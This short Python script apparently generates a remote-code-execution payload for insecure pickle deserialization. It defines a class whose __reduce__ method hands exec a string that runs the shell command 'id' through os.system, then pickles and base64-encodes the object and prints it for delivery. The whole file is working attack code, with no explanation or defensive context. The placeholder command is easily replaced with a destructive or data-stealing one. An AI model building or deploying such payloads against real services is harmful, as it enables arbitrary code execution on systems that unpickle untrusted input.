#!/usr/bin/env python3

import pickle
import base64

class RCEPayload:
    def __reduce__(self):
        return exec, ("import os; os.system('id')",)

payload = RCEPayload()
serializedData = base64.b64encode(pickle.dumps(payload)).decode('utf-8')
print(serializedData)